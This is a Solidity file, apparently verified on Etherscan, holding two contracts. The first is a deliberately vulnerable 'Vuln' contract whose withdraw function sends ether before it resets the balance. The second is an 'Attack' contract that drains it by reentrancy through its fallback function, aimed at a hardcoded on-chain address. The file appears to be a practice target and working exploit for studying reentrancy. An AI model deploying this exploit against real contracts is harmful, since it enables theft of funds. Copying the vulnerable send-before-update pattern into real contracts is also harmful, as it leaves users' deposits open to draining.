/**
 *Submitted for verification at Etherscan.io on 2021-12-06
*/

// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack{

    uint stealtimes;

    fallback () external payable{
        Vuln v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
        stealtimes++;
        if(stealtimes < 3){
            v.withdraw();
        }
    }

    function attack() public payable{
        Vuln v = Vuln(address(0x36A540E3A78084962B75E25877CfACf8846Be018));
        v.deposit.value(.01 ether)();
        v.withdraw();
    }

    
}